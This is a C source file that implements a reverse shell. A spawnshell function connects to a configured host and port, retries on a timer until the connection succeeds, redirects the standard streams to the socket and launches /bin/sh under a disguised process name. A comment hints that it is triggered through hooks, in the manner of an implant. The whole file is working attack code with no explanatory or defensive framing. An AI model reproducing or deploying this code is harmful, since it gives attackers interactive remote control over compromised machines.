#include "revshell.h"

char server[] = "localhost";
int port = 1234;
char shell[] = "/bin/sh";
char fakename[] = "REVSHELL-CONSOLE";
int TIMEOUT = 3;

int spawnshell(char ip[])
{
  int mainsock;
  char title[4096] = "";
  int x;


  again:

    mainsock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in sin;
  struct hostent * host = gethostbyname(server);

  memcpy(&sin.sin_addr.s_addr, host->h_addr, host-> h_length);
  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);

  if (connect(mainsock, (struct sockaddr * ) & sin, sizeof(sin)) < 0) 
  {
    sleep(TIMEOUT);
    goto again;
  }

  setsid();
  umask(0);
  dup2(mainsock, 0);
  dup2(mainsock, 1);
  dup2(mainsock, 2);

  fprintf(stderr, "Connection recieved.");
  // this might trigger our hooks, infite shells?
  //sprintf(title, "Welcome %s (%s)", getenv("USER"), getenv("HOME"));
  chdir(getenv("HOME"));
  fprintf(stderr, "\n");
  

  execl(shell, fakename, "-i", 0);
  close(mainsock);
  return 0;
}
